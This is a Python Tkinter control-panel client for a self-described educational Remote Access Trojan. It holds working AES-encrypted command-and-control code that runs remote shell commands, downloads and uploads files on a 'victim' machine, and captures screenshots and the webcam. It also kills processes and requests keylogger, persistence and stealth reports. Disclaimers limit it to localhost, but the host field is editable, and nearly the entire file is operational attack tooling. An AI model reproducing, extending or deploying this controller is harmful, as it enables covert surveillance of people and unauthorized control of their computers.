"""
ENHANCED RAT Client - Educational Advanced Version
=================================================
⚠️  EDUCATIONAL PURPOSE ONLY - LOCALHOST ONLY ⚠️

Advanced controller with:
- AES-256 encrypted communication
- Professional hacker-style GUI
- All RAT features
- Educational demonstrations

TERMS & CONDITIONS:
- FOR EDUCATIONAL/PORTFOLIO USE ONLY
- LOCALHOST (127.0.0.1) ONLY
- NO ILLEGAL USE
- CREATOR NOT LIABLE FOR MISUSE
"""

import socket
import json
import base64
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
from PIL import Image, ImageTk
import io
import threading
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib

# Configuration
HOST = '127.0.0.1'
PORT = 4444
BUFFER_SIZE = 8192
ENCRYPTION_KEY = hashlib.sha256(b"RAT_DEMO_KEY_2025").digest()

class RATClient:
    def __init__(self, root):
        self.root = root
        self.root.title("Advanced RAT Control Panel v2.0 - Educational Project")
        self.root.geometry("1000x750")
        self.root.resizable(False, False)
        self.root.configure(bg='#1e1e1e')
        
        self.socket = None
        self.connected = False
        self.encryption_enabled = True
        
        # Setup GUI
        self.setup_gui()
        
    def setup_gui(self):
        """Create the GUI layout"""
        
        # Title Frame
        title_frame = tk.Frame(self.root, bg="#2c3e50", height=60)
        title_frame.pack(fill=tk.X)
        
        title_label = tk.Label(
            title_frame,
            text="🔐 RAT Control Panel",
            font=("Arial", 18, "bold"),
            bg="#2c3e50",
            fg="white"
        )
        title_label.pack(pady=15)
        
        # Connection Frame
        conn_frame = tk.LabelFrame(self.root, text="Connection", font=("Arial", 10, "bold"), padx=10, pady=10)
        conn_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(conn_frame, text="Host:").grid(row=0, column=0, padx=5)
        self.host_entry = tk.Entry(conn_frame, width=20)
        self.host_entry.insert(0, HOST)
        self.host_entry.grid(row=0, column=1, padx=5)
        
        tk.Label(conn_frame, text="Port:").grid(row=0, column=2, padx=5)
        self.port_entry = tk.Entry(conn_frame, width=10)
        self.port_entry.insert(0, str(PORT))
        self.port_entry.grid(row=0, column=3, padx=5)
        
        self.connect_btn = tk.Button(
            conn_frame,
            text="Connect",
            command=self.connect_to_server,
            bg="#27ae60",
            fg="white",
            width=15
        )
        self.connect_btn.grid(row=0, column=4, padx=10)
        
        self.status_label = tk.Label(conn_frame, text="● Disconnected", fg="red", font=("Arial", 10, "bold"))
        self.status_label.grid(row=0, column=5, padx=10)
        
        # Commands Frame
        cmd_frame = tk.LabelFrame(self.root, text="Commands", font=("Arial", 10, "bold"), padx=10, pady=10)
        cmd_frame.pack(fill=tk.BOTH, padx=10, pady=10)
        
        # Row 1
        tk.Button(cmd_frame, text="📊 System Info", command=self.cmd_sysinfo, width=20, height=2, bg="#3498db", fg="white").grid(row=0, column=0, padx=5, pady=5)
        tk.Button(cmd_frame, text="📸 Screenshot", command=self.cmd_screenshot, width=20, height=2, bg="#3498db", fg="white").grid(row=0, column=1, padx=5, pady=5)
        tk.Button(cmd_frame, text="🖥️ Remote Shell", command=self.cmd_shell, width=20, height=2, bg="#3498db", fg="white").grid(row=0, column=2, padx=5, pady=5)
        
        # Row 2
        tk.Button(cmd_frame, text="📁 File Browser", command=self.cmd_filebrowser, width=20, height=2, bg="#3498db", fg="white").grid(row=1, column=0, padx=5, pady=5)
        tk.Button(cmd_frame, text="⚙️ Process List", command=self.cmd_processlist, width=20, height=2, bg="#3498db", fg="white").grid(row=1, column=1, padx=5, pady=5)
        tk.Button(cmd_frame, text="📥 Download File", command=self.cmd_download, width=20, height=2, bg="#3498db", fg="white").grid(row=1, column=2, padx=5, pady=5)
        
        # Row 3
        tk.Button(cmd_frame, text="📤 Upload File", command=self.cmd_upload, width=20, height=2, bg="#3498db", fg="white").grid(row=2, column=0, padx=5, pady=5)
        tk.Button(cmd_frame, text="🔴 Kill Process", command=self.cmd_killprocess, width=20, height=2, bg="#e74c3c", fg="white").grid(row=2, column=1, padx=5, pady=5)
        tk.Button(cmd_frame, text="🏓 Ping", command=self.cmd_ping, width=20, height=2, bg="#2ecc71", fg="white").grid(row=2, column=2, padx=5, pady=5)
        
        # Row 4 - Advanced Features
        tk.Button(cmd_frame, text="⌨️ Keylogger", command=self.cmd_keylogger, width=20, height=2, bg="#9b59b6", fg="white").grid(row=3, column=0, padx=5, pady=5)
        tk.Button(cmd_frame, text="📷 Webcam Capture", command=self.cmd_webcam, width=20, height=2, bg="#9b59b6", fg="white").grid(row=3, column=1, padx=5, pady=5)
        tk.Button(cmd_frame, text="🔒 Persistence Info", command=self.cmd_persistence, width=20, height=2, bg="#34495e", fg="white").grid(row=3, column=2, padx=5, pady=5)
        
        # Row 5 - Stealth Features
        tk.Button(cmd_frame, text="👻 Stealth Info", command=self.cmd_stealth, width=20, height=2, bg="#34495e", fg="white").grid(row=4, column=0, padx=5, pady=5)
        tk.Button(cmd_frame, text="🔐 Encryption Test", command=self.cmd_encryption_test, width=20, height=2, bg="#16a085", fg="white").grid(row=4, column=1, padx=5, pady=5)
        tk.Button(cmd_frame, text="ℹ️ About RAT", command=self.show_about, width=20, height=2, bg="#7f8c8d", fg="white").grid(row=4, column=2, padx=5, pady=5)
        
        # Output Frame
        output_frame = tk.LabelFrame(self.root, text="Output Console", font=("Arial", 10, "bold"), padx=10, pady=10)
        output_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.output_text = scrolledtext.ScrolledText(
            output_frame,
            height=15,
            width=100,
            font=("Consolas", 9),
            bg="#1e1e1e",
            fg="#00ff00",
            insertbackground="white"
        )
        self.output_text.pack(fill=tk.BOTH, expand=True)
        
        # Bottom buttons
        bottom_frame = tk.Frame(self.root)
        bottom_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Button(bottom_frame, text="Clear Output", command=self.clear_output, width=15).pack(side=tk.LEFT, padx=5)
        tk.Button(bottom_frame, text="Disconnect", command=self.disconnect, width=15).pack(side=tk.RIGHT, padx=5)
        
        self.log("[*] RAT Client started - Localhost only")
        self.log("[*] Click 'Connect' to establish connection")
        
    def log(self, message):
        """Add message to output console"""
        self.output_text.insert(tk.END, f"{message}\n")
        self.output_text.see(tk.END)
        
    def clear_output(self):
        """Clear the output console"""
        self.output_text.delete('1.0', tk.END)
        
    def connect_to_server(self):
        """Connect to the RAT server"""
        if self.connected:
            self.log("[-] Already connected!")
            return
            
        try:
            host = self.host_entry.get()
            port = int(self.port_entry.get())
            
            self.log(f"[*] Connecting to {host}:{port}...")
            
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((host, port))
            
            # Receive welcome message
            response = self.receive_response()
            
            if response and response.get('status') == 'connected':
                self.connected = True
                self.status_label.config(text="● Connected", fg="green")
                self.connect_btn.config(state=tk.DISABLED)
                self.log(f"[+] Connected successfully!")
                self.log(f"[+] {response.get('message', '')}")
            else:
                raise Exception("Connection failed")
                
        except Exception as e:
            self.log(f"[-] Connection error: {str(e)}")
            messagebox.showerror("Connection Error", str(e))
            
    def disconnect(self):
        """Disconnect from server"""
        if self.connected:
            try:
                self.send_command({"command": "shutdown"})
                self.socket.close()
            except:
                pass
                
        self.connected = False
        self.status_label.config(text="● Disconnected", fg="red")
        self.connect_btn.config(state=tk.NORMAL)
        self.log("[*] Disconnected from server")
    
    def encrypt_data(self, data):
        """Encrypt data using AES-256-CBC with random IV"""
        if not self.encryption_enabled:
            return data
            
        try:
            iv = os.urandom(16)
            cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
            padded_data = pad(data.encode(), AES.block_size)
            ciphertext = cipher.encrypt(padded_data)
            
            encrypted_package = {
                'iv': base64.b64encode(iv).decode(),
                'ciphertext': base64.b64encode(ciphertext).decode()
            }
            return json.dumps(encrypted_package)
        except Exception as e:
            self.log(f"[-] Encryption error: {e}", "ERROR")
            return data
    
    def decrypt_data(self, encrypted_data):
        """Decrypt data using AES-256-CBC"""
        if not self.encryption_enabled:
            return encrypted_data
            
        try:
            package = json.loads(encrypted_data)
            iv = base64.b64decode(package['iv'])
            ciphertext = base64.b64decode(package['ciphertext'])
            
            cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
            decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
            return decrypted_data.decode()
        except Exception as e:
            self.log(f"[-] Decryption error: {e}", "ERROR")
            return encrypted_data
        
    def send_command(self, command_data):
        """Send command to server with encryption"""
        if not self.connected:
            self.log("[-] Not connected to server!")
            return None
            
        try:
            json_data = json.dumps(command_data)
            encrypted_data = self.encrypt_data(json_data)
            self.socket.send((encrypted_data + '\n').encode('utf-8'))
            return self.receive_response()
        except Exception as e:
            self.log(f"[-] Error sending command: {str(e)}")
            return None
            
    def receive_response(self):
        """Receive response from server with decryption"""
        try:
            data = b''
            while True:
                chunk = self.socket.recv(BUFFER_SIZE)
                if not chunk:
                    break
                data += chunk
                if b'\n' in chunk:
                    break
            
            if not data:
                return None
            
            encrypted_response = data.decode('utf-8').strip()
            decrypted_response = self.decrypt_data(encrypted_response)
            return json.loads(decrypted_response)
        except Exception as e:
            self.log(f"[-] Error receiving response: {str(e)}")
            return None
            
    # ========== Command Implementations ==========
    
    def cmd_ping(self):
        """Test connection"""
        self.log("[*] Sending ping...")
        response = self.send_command({"command": "ping"})
        
        if response and response.get('status') == 'success':
            self.log(f"[+] Response: {response.get('message')}")
        else:
            self.log("[-] Ping failed")
            
    def cmd_sysinfo(self):
        """Get system information"""
        self.log("[*] Requesting system information...")
        response = self.send_command({"command": "sysinfo"})
        
        if response and response.get('status') == 'success':
            data = response.get('data', {})
            self.log("[+] System Information:")
            self.log("=" * 50)
            for key, value in data.items():
                self.log(f"  {key}: {value}")
            self.log("=" * 50)
        else:
            self.log(f"[-] Error: {response.get('message', 'Unknown error')}")
            
    def cmd_screenshot(self):
        """Take screenshot"""
        self.log("[*] Requesting screenshot...")
        response = self.send_command({"command": "screenshot"})
        
        if response and response.get('status') == 'success':
            self.log(f"[+] Screenshot received ({response.get('size')} bytes)")
            
            # Decode image
            img_data = base64.b64decode(response.get('data'))
            img = Image.open(io.BytesIO(img_data))
            
            # Save image
            filename = f"screenshot_{os.getpid()}.png"
            img.save(filename)
            self.log(f"[+] Screenshot saved as: {filename}")
            
            # Show in new window
            self.show_image(img, "Screenshot")
            
        else:
            self.log(f"[-] Error: {response.get('message', 'Unknown error')}")
            
    def show_image(self, img, title="Image"):
        """Display image in new window"""
        window = tk.Toplevel(self.root)
        window.title(title)
        
        # Resize if too large
        max_width, max_height = 800, 600
        img.thumbnail((max_width, max_height), Image.Resampling.LANCZOS)
        
        photo = ImageTk.PhotoImage(img)
        label = tk.Label(window, image=photo)
        label.image = photo  # Keep reference
        label.pack()
        
    def cmd_shell(self):
        """Execute shell command"""
        command = tk.simpledialog.askstring("Remote Shell", "Enter command to execute:")
        
        if not command:
            return
            
        self.log(f"[*] Executing: {command}")
        response = self.send_command({"command": "shell", "params": command})
        
        if response and response.get('status') == 'success':
            self.log("[+] Command output:")
            self.log(response.get('output', ''))
        else:
            self.log(f"[-] Error: {response.get('message', 'Unknown error')}")
            
    def cmd_filebrowser(self):
        """Browse remote filesystem"""
        path = tk.simpledialog.askstring("File Browser", "Enter path to list:", initialvalue=".")
        
        if not path:
            return
            
        self.log(f"[*] Listing directory: {path}")
        response = self.send_command({"command": "listdir", "path": path})
        
        if response and response.get('status') == 'success':
            items = response.get('items', [])
            self.log(f"[+] Directory: {response.get('path')}")
            self.log("=" * 50)
            
            for item in items:
                type_icon = "📁" if item['type'] == 'dir' else "📄"
                size = f"({item['size']} bytes)" if item['type'] == 'file' else ""
                self.log(f"{type_icon} {item['name']} {size}")
                
            self.log("=" * 50)
        else:
            self.log(f"[-] Error: {response.get('message', 'Unknown error')}")
            
    def cmd_processlist(self):
        """Get process list"""
        self.log("[*] Requesting process list...")
        response = self.send_command({"command": "processlist"})
        
        if response and response.get('status') == 'success':
            self.log("[+] Process List:")
            self.log("=" * 50)
            self.log(response.get('data', ''))
            self.log("=" * 50)
        else:
            self.log(f"[-] Error: {response.get('message', 'Unknown error')}")
            
    def cmd_killprocess(self):
        """Kill a process"""
        process_name = tk.simpledialog.askstring("Kill Process", "Enter process name (e.g., notepad.exe):")
        
        if not process_name:
            return
            
        confirm = messagebox.askyesno("Confirm", f"Kill process '{process_name}'?")
        if not confirm:
            return
            
        self.log(f"[*] Killing process: {process_name}")
        response = self.send_command({"command": "killprocess", "pid": process_name})
        
        if response and response.get('status') == 'success':
            self.log(f"[+] {response.get('message')}")
        else:
            self.log(f"[-] Error: {response.get('message', 'Unknown error')}")
            
    def cmd_download(self):
        """Download file from victim"""
        filepath = tk.simpledialog.askstring("Download File", "Enter remote file path:")
        
        if not filepath:
            return
            
        self.log(f"[*] Downloading: {filepath}")
        response = self.send_command({"command": "download", "filepath": filepath})
        
        if response and response.get('status') == 'success':
            # Decode file
            file_data = base64.b64decode(response.get('data'))
            
            # Save file
            save_path = filedialog.asksaveasfilename(
                initialfile=response.get('filename'),
                defaultextension=".*"
            )
            
            if save_path:
                with open(save_path, 'wb') as f:
                    f.write(file_data)
                self.log(f"[+] File saved: {save_path} ({response.get('size')} bytes)")
            else:
                self.log("[-] Save cancelled")
        else:
            self.log(f"[-] Error: {response.get('message', 'Unknown error')}")
            
    def cmd_upload(self):
        """Upload file to victim"""
        filepath = filedialog.askopenfilename(title="Select file to upload")
        
        if not filepath:
            return
            
        # Read file
        with open(filepath, 'rb') as f:
            file_data = f.read()
            
        # Encode to base64
        file_base64 = base64.b64encode(file_data).decode('utf-8')
        
        # Ask for remote path
        remote_path = tk.simpledialog.askstring(
            "Upload File",
            "Enter remote path:",
            initialvalue=os.path.basename(filepath)
        )
        
        if not remote_path:
            return
            
        self.log(f"[*] Uploading: {filepath} -> {remote_path}")
        response = self.send_command({
            "command": "upload",
            "filepath": remote_path,
            "data": file_base64
        })
        
        if response and response.get('status') == 'success':
            self.log(f"[+] {response.get('message')}")
        else:
            self.log(f"[-] Error: {response.get('message', 'Unknown error')}")
    
    # ========== Advanced Features ==========
    
    def cmd_keylogger(self):
        """Keylogger simulation - Educational only"""
        self.log("[*] Requesting keylogger data (SIMULATED)...")
        response = self.send_command({"command": "keylog"})
        
        if response and response.get('status') == 'success':
            data = response.get('data', {})
            self.log("[+] Keylogger Status:")
            self.log("=" * 50)
            self.log(f"  Active: {data.get('active', False)}")
            self.log(f"  Buffer Size: {data.get('buffer_size', 0)} keystrokes")
            self.log(f"  Sample Data (Simulated): {data.get('sample', 'N/A')}")
            self.log("\n⚠️  NOTE: This is SIMULATED data for educational purposes")
            self.log("    Real keyloggers are illegal without authorization!")
            self.log("=" * 50)
        else:
            self.log(f"[-] Error: {response.get('message', 'Unknown error')}")
    
    def cmd_webcam(self):
        """Capture webcam image"""
        self.log("[*] Requesting webcam capture...")
        response = self.send_command({"command": "webcam"})
        
        if response and response.get('status') == 'success':
            image_data = base64.b64decode(response.get('data'))
            
            # Display image
            image = Image.open(io.BytesIO(image_data))
            
            # Create new window to show webcam image
            img_window = tk.Toplevel(self.root)
            img_window.title("Webcam Capture")
            img_window.configure(bg='#1e1e1e')
            
            # Resize if too large
            max_size = (800, 600)
            image.thumbnail(max_size, Image.Resampling.LANCZOS)
            
            photo = ImageTk.PhotoImage(image)
            label = tk.Label(img_window, image=photo, bg='#1e1e1e')
            label.image = photo  # Keep reference
            label.pack(padx=10, pady=10)
            
            # Save button
            def save_webcam():
                save_path = filedialog.asksaveasfilename(
                    defaultextension=".jpg",
                    filetypes=[("JPEG", "*.jpg"), ("PNG", "*.png")]
                )
                if save_path:
                    image.save(save_path)
                    self.log(f"[+] Webcam image saved: {save_path}")
            
            tk.Button(img_window, text="Save Image", command=save_webcam, bg="#27ae60", fg="white").pack(pady=5)
            
            self.log("[+] Webcam capture successful!")
        else:
            self.log(f"[-] Error: {response.get('message', 'Unknown error')}")
    
    def cmd_persistence(self):
        """Get persistence information"""
        self.log("[*] Requesting persistence information...")
        response = self.send_command({"command": "persistence"})
        
        if response and response.get('status') == 'success':
            data = response.get('data', {})
            self.log("[+] Persistence Techniques (Educational Info):")
            self.log("=" * 60)
            
            if 'registry' in data:
                self.log("\n📋 Registry Persistence:")
                for method in data['registry']:
                    self.log(f"  • {method}")
            
            if 'startup' in data:
                self.log("\n📁 Startup Folder:")
                for method in data['startup']:
                    self.log(f"  • {method}")
            
            if 'scheduled_tasks' in data:
                self.log("\n⏰ Scheduled Tasks:")
                for method in data['scheduled_tasks']:
                    self.log(f"  • {method}")
            
            if 'services' in data:
                self.log("\n⚙️ Windows Services:")
                for method in data['services']:
                    self.log(f"  • {method}")
            
            self.log("\n⚠️  NOTE: This information is for EDUCATIONAL purposes only!")
            self.log("    Creating unauthorized persistence mechanisms is ILLEGAL!")
            self.log("=" * 60)
        else:
            self.log(f"[-] Error: {response.get('message', 'Unknown error')}")
    
    def cmd_stealth(self):
        """Get stealth techniques information"""
        self.log("[*] Requesting stealth information...")
        response = self.send_command({"command": "stealth"})
        
        if response and response.get('status') == 'success':
            data = response.get('data', {})
            self.log("[+] Stealth Techniques & Detection (Educational Info):")
            self.log("=" * 60)
            
            if 'techniques' in data:
                self.log("\n🔒 Stealth Techniques Used:")
                for technique in data['techniques']:
                    self.log(f"  • {technique}")
            
            if 'detection_methods' in data:
                self.log("\n🔍 Detection Methods:")
                for method in data['detection_methods']:
                    self.log(f"  • {method}")
            
            if 'current_status' in data:
                self.log("\n📊 Current Status:")
                for key, value in data['current_status'].items():
                    self.log(f"  {key}: {value}")
            
            self.log("\n⚠️  NOTE: Understanding stealth techniques helps in DEFENSE!")
            self.log("    Use this knowledge to secure systems, not exploit them!")
            self.log("=" * 60)
        else:
            self.log(f"[-] Error: {response.get('message', 'Unknown error')}")
    
    def cmd_encryption_test(self):
        """Test encryption functionality"""
        self.log("[*] Testing AES-256 encryption...")
        self.log("=" * 60)
        self.log(f"🔐 Encryption Enabled: {self.encryption_enabled}")
        self.log(f"🔑 Algorithm: AES-256-CBC with random IV")
        self.log(f"🔒 Key Derivation: SHA-256 hash of passphrase")
        
        # Send ping as encryption test
        test_response = self.send_command({"command": "ping"})
        
        if test_response and test_response.get('status') == 'success':
            self.log("[+] ✅ Encryption test SUCCESSFUL!")
            self.log("[+] Command encrypted → Server decrypted → Response encrypted → Client decrypted")
        else:
            self.log("[-] ❌ Encryption test FAILED!")
        
        self.log("=" * 60)
    
    def show_about(self):
        """Show About dialog"""
        about_text = """
        🔐 Advanced RAT Control Panel v2.0
        ===================================
        
        Educational Remote Access Trojan
        Developed for Security Research & Portfolio
        
        Features:
        • AES-256 Encrypted Communication
        • System Information Gathering
        • Remote Shell Access
        • File Transfer (Upload/Download)
        • Screenshot & Webcam Capture
        • Process Management
        • Keylogger Simulation
        • Persistence Techniques (Info)
        • Stealth Analysis
        
        ⚠️  TERMS & CONDITIONS ⚠️
        • FOR EDUCATIONAL USE ONLY
        • LOCALHOST (127.0.0.1) ONLY
        • NO UNAUTHORIZED ACCESS
        • CREATOR NOT LIABLE FOR MISUSE
        
        For interviews, demonstrations, and
        security research purposes only.
        """
        
        messagebox.showinfo("About RAT", about_text)
            
def main():
    """Main entry point"""
    root = tk.Tk()
    app = RATClient(root)
    
    # Show terms on startup
    terms = """
    ⚠️  EDUCATIONAL PROJECT - TERMS & CONDITIONS ⚠️
    
    This Remote Access Trojan (RAT) is for:
    ✅ Educational purposes
    ✅ Portfolio demonstrations
    ✅ Security research
    ✅ Interview presentations
    
    RESTRICTIONS:
    ❌ NO unauthorized access to systems
    ❌ NO use on networks without permission
    ❌ LOCALHOST ONLY (127.0.0.1)
    ❌ NO illegal activities
    
    By using this tool, you agree to use it ONLY
    for legal, educational purposes on your own
    systems or with explicit written permission.
    
    Creator is NOT liable for any misuse.
    
    Do you understand and agree?
    """
    
    if not messagebox.askyesno("Terms & Conditions", terms):
        root.destroy()
        return
    
    root.mainloop()
    
if __name__ == "__main__":
    main()
